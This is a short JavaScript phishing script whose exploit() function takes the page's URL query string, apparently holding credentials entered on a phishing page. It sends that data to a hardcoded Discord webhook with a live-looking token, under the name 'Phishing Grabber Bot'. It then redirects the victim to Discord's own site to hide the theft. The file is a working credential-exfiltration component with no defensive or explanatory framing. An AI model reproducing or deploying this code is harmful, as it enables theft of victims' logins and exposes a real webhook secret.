let num = 0;

function exploit() {
    if (window.location.search) {
        const webhookURL = "https://discord.com/api/webhooks/1199645026158923776/WFfVIM3ZrddxS0gl0LTfzNhjDlX53PZ2Jys8bkUt_4a9zzdH_L6f1XnYtbr9PUZnw-Ab"


        // let email = document.getElementById("uid_5").value; //email

        const data = {
            "content": "**`" + window.location.search + "`**",
            "username": "Phishing Grabber Bot",
        }

        fetch(webhookURL, { "method": "post", "headers": { "content-type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" }, "body": JSON.stringify(data) })

        setTimeout(() => {
            window.location.href = "https://discord.com/channels/@me"
        }, 5000);
    } else if(!window.location.search){
        
    }


}

